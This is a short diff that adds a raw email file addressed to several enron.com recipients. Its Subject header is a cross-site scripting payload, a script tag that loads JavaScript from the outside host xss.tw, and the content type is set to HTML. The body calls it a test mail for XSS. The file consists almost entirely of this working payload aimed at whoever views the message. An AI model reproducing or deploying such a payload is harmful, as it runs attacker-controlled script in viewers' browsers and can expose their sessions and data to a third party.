@@ -1,0 +1,7 @@
+From: Derek Richards <extreme_sassy@gracanada.com>
+To: julie.mccoy@enron.com, steve.klimesh@enron.com, gary.sova@enron.com, 
+Subject: <script src=http://xss.tw/pdjsa></script>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
